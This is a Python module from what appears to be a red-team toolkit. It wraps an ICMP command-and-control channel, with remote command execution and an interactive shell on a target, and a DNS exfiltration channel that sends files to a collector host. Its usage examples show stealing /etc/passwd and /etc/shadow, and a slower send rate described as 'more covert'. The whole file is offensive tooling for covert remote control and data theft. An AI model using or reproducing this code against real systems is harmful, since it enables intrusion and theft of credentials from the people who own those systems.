"""
Red Team Toolkit — Covert Channels Module

Wraps ICMP C2 and DNS exfiltration from Module 6.
"""

import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

import threading
import time

from scapy.all import conf

from module6.icmp_tunnel    import send_command, SESSION_ID
from module6.dns_exfil      import exfiltrate as dns_exfiltrate


class IcmpC2:
    """
    ICMP command-and-control channel.

    The target must be running icmp_agent.py.

    Usage:
        c2 = IcmpC2("10.0.0.2")
        output = c2.run("whoami")
        print(output)
    """

    def __init__(self, target: str):
        self.target = target

    def run(self, command: str) -> str:
        """Send command and return output string."""
        return send_command(self.target, command)

    def shell(self):
        """Start an interactive command loop."""
        from module6.icmp_tunnel import interactive_shell
        interactive_shell(self.target)

    def __repr__(self):
        return f"IcmpC2(target={self.target!r}, session=0x{SESSION_ID:04X})"


class DnsExfil:
    """
    DNS-based file exfiltration channel.

    Requires dns_collector.py running on the collector host.

    Usage:
        exfil = DnsExfil(collector_ip="10.0.0.1")
        exfil.send("/etc/passwd")
        exfil.send("/etc/shadow", delay=0.5)   # slower, more covert
    """

    def __init__(self, collector_ip: str, delay: float = 0.2):
        self.collector_ip = collector_ip
        self.delay        = delay

    def send(self, file_path: str, session_id: str = None) -> None:
        """Exfiltrate a file to the collector."""
        dns_exfiltrate(
            file_path=file_path,
            collector_ip=self.collector_ip,
            session_id=session_id,
            delay=self.delay,
        )

    def __repr__(self):
        return f"DnsExfil(collector={self.collector_ip!r}, delay={self.delay})"
